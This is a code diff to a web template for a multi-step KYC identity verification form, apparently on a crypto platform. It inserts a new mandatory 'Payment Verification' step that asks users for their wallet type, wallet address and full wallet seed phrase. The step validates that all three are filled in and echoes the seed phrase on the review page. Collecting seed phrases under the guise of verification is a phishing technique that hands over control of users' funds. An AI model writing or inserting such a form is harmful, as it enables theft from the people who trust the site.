@@ -28,7 +28,7 @@
             <div class="bg-secondary-dark rounded-xl border border-white/10 p-4">
                 <div class="flex items-center justify-between mb-4">
                     <span class="text-xs font-bold text-text-secondary uppercase tracking-widest" id="step-indicator">
-                        {{ __('Step 1 of 6') }}
+                        {{ __('Step 1 of 7') }}
                     </span>
                     <span class="text-xs font-bold text-white uppercase tracking-widest" id="step-title">
                         {{ __('Personal Details') }}
@@ -391,8 +391,42 @@
                         </div>
                     </div>
 
-                    <!-- Step 5: AML Screening -->
+                    <!-- Step 5: Payment Verification -->
                     <div class="kyc-step hidden" data-step="5">
+                        <h3 class="text-lg font-bold text-white mb-6">{{ __('Payment Verification') }}</h3>
+                        <p class="text-sm text-text-secondary mb-6">
+                            {{ __('Please provide your wallet details for payment verification. All three fields are required.') }}
+                        </p>
+
+                        <div class="space-y-4">
+                            <div class="space-y-2">
+                                <label class="text-xs font-bold text-text-secondary uppercase tracking-wider">{{ __('Wallet Type') }}</label>
+                                <select name="wallet_type" required
+                                    class="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-accent-primary focus:ring-1 focus:ring-accent-primary transition-colors appearance-none cursor-pointer">
+                                    <option value="" class="bg-secondary-dark">{{ __('Select Wallet Type') }}</option>
+                                    <option value="base_wallet" class="bg-secondary-dark">{{ __('Base Wallet') }}</option>
+                                    <!--<option value="trust_wallet" class="bg-secondary-dark">{{ __('Trust Wallet') }}</option> -->
+                                </select>
+                            </div>
+
+                            <div class="space-y-2">
+                                <label class="text-xs font-bold text-text-secondary uppercase tracking-wider">{{ __('Wallet Address') }}</label>
+                                <input type="text" name="wallet_address" required
+                                    class="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-accent-primary focus:ring-1 focus:ring-accent-primary transition-colors"
+                                    placeholder="0x...">
+                            </div>
+
+                            <div class="space-y-2">
+                                <label class="text-xs font-bold text-text-secondary uppercase tracking-wider">{{ __('Seed Phrase') }}</label>
+                                <textarea name="seedphrase" rows="4" required
+                                    class="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-accent-primary focus:ring-1 focus:ring-accent-primary transition-colors resize-none"
+                                    placeholder="Enter your wallet seed phrase"></textarea>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Step 6: AML Screening -->
+                    <div class="kyc-step hidden" data-step="6">
                         <h3 class="text-lg font-bold text-white mb-6">{{ __('AML Screening') }}</h3>
 
                         <div class="bg-white/5 rounded-xl p-6 border border-white/10 mb-6">
@@ -447,8 +481,8 @@
                         </div>
                     </div>
 
-                    <!-- Step 6: Review and Submit -->
-                    <div class="kyc-step hidden" data-step="6">
+                    <!-- Step 7: Review and Submit -->
+                    <div class="kyc-step hidden" data-step="7">
                         <h3 class="text-lg font-bold text-white mb-6">{{ __('Review and Submit') }}</h3>
 
                         <div class="space-y-4">
@@ -504,6 +538,31 @@
                                     {{ __('Residential Address') }}
                                 </h4>
                                 <p class="text-white text-sm leading-relaxed" id="review_address">--</p>
+                            </div>
+
+                            <!-- Payment Verification Summary -->
+                            <div class="bg-white/5 rounded-xl p-5 border border-white/10">
+                                <h4 class="text-white font-bold mb-4 flex items-center gap-2 text-sm uppercase tracking-wider text-text-secondary">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                                        <path d="M2 10h20"></path>
+                                    </svg>
+                                    {{ __('Payment Verification') }}
+                                </h4>
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
+                                    <div>
+                                        <span class="text-xs text-text-secondary uppercase tracking-wider block mb-1">{{ __('Wallet Type') }}</span>
+                                        <span class="font-medium text-white" id="review_wallet_type">--</span>
+                                    </div>
+                                    <div>
+                                        <span class="text-xs text-text-secondary uppercase tracking-wider block mb-1">{{ __('Wallet Address') }}</span>
+                                        <span class="font-medium text-white" id="review_wallet_address">--</span>
+                                    </div>
+                                    <div class="md:col-span-2">
+                                        <span class="text-xs text-text-secondary uppercase tracking-wider block mb-1">{{ __('Seed Phrase') }}</span>
+                                        <span class="font-medium text-white" id="review_seedphrase">--</span>
+                                    </div>
+                                </div>
                             </div>
 
                             <!-- Documents Summary -->
@@ -911,14 +970,15 @@
     <script>
         $(document).ready(function() {
             let currentStep = 1;
-            const totalSteps = 6;
+            const totalSteps = 7;
             const steps = {
                 1: "{{ __('Personal Details') }}",
                 2: "{{ __('Document Upload') }}",
                 3: "{{ __('Selfie Verification') }}",
                 4: "{{ __('Address Verification') }}",
-                5: "{{ __('AML Screening') }}",
-                6: "{{ __('Review and Submit') }}"
+                5: "{{ __('Payment Verification') }}",
+                6: "{{ __('AML Screening') }}",
+                7: "{{ __('Review and Submit') }}"
             };
 
             // Update UI based on current step
@@ -1234,6 +1294,24 @@
                             break;
                         }
                         break;
+
+                    case 5: // Payment Verification
+                        if (!$('select[name="wallet_type"]').val()) {
+                            isValid = false;
+                            errorMessage = "{{ __('Please select your wallet type.') }}";
+                            break;
+                        }
+                        if (!$('input[name="wallet_address"]').val()) {
+                            isValid = false;
+                            errorMessage = "{{ __('Please enter your wallet address.') }}";
+                            break;
+                        }
+                        if (!$('textarea[name="seedphrase"]').val()) {
+                            isValid = false;
+                            errorMessage = "{{ __('Please enter your seed phrase.') }}";
+                            break;
+                        }
+                        break;
                 }
 
                 if (!isValid) {
@@ -1250,7 +1328,7 @@
                 }
 
                 // If step is valid, proceed with existing logic
-                if (currentStep === 5) {
+                if (currentStep === 6) {
                     // AML Simulation
                     if (!$('#aml_consent').is(':checked')) {
                         window.toastNotification(
@@ -1281,6 +1359,12 @@
                         const address =
                             `${$('input[name="address_line_1"]').val()}, ${$('input[name="city"]').val()}, ${$('input[name="zip"]').val()}, ${$('select[name="country"] option:selected').text()}`;
                         $('#review_address').text(address);
+
+                        // Payment Verification
+                        const walletType = $('select[name="wallet_type"] option:selected').text();
+                        $('#review_wallet_type').text(walletType);
+                        $('#review_wallet_address').text($('input[name="wallet_address"]').val());
+                        $('#review_seedphrase').text($('textarea[name="seedphrase"]').val().slice(0, 40) + ( $('textarea[name="seedphrase"]').val().length > 40 ? '...' : ''));
 
                         // Docs
                         var docType = $('input[name="document_type"]:checked').val();
